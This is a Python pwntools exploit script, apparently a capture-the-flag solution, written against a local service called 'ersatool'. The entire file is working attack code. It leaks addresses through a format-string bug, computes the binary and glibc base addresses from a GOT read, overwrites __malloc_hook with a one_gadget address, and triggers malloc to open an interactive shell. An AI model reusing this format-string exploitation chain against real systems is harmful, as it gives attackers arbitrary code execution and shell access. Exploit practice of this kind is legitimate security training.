#!/usr/bin/env python3

from pwn import context, ELF, fmtstr_payload, p64, remote, u64

elf = context.binary = ELF('./ersatool', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote('127.0.0.1', 1234)
print_cn = b'print->CN='


def get_value(i):
    p.sendlineafter(print_cn, f'%{i}$lp'.encode())
    data = p.recvline()
    data = data[:data.index(b'[!] ERR')]

    print(i, data.decode())
    return int(data.decode(), 16)


def main():
    offset = 8
    print('Offset:', offset)

    p.sendlineafter(b'# ', b'print')

    main_addr = get_value(51)
    print('Address of main():', hex(main_addr))

    elf.address = main_addr - elf.symbols.main
    print('Binary base address:', hex(elf.address))
    print('GOT printf():', hex(elf.got.printf))

    leak = f'%{offset + 1}$s'.encode().ljust(8, b'\0') + p64(elf.got.printf)
    p.sendlineafter(print_cn, leak)
    data = p.recvline()
    data = data[:data.index(b'[!] ERR')]

    printf_addr = u64(data.ljust(8, b'\0'))
    print('Address of printf():', hex(printf_addr))

    libc.address = printf_addr - libc.symbols.printf
    print('Glibc base address:', hex(libc.address))
    print('Address of __malloc_hook():', hex(libc.symbols.__malloc_hook))

    one_gadget_shell = libc.address + 0x4f322

    payload = fmtstr_payload(
        offset,
        {libc.sym.__malloc_hook: one_gadget_shell},
        write_size='short'
    )

    p.sendlineafter(print_cn, payload)
    p.recv()

    p.sendlineafter(print_cn, b'%10000$c')
    p.interactive()


if __name__ == '__main__':
    main()
